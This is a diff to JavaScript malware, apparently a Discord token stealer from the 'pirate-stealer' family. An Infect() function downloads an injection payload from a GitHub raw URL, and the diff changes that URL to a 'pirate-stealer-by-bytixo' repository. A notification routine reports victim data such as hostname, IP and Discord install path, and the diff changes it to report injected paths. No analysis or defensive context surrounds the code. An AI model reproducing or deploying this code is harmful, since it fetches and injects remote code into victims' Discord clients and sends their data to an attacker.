@@ -43,7 +43,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/TribhuvanN/ok/main/injection', (resp) => {
+    https.get('https://raw.githubusercontent.com/StampyGumball/pirate-stealer-by-bytixo/main/src/Injection/injection', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
@@ -159,8 +159,8 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
-            name: "<a:roundround:919629668284497972> Info",
-            value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
+            name: "<a:roundround:919629668284497972> Injected Path",
+            value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
         fields.push(c)
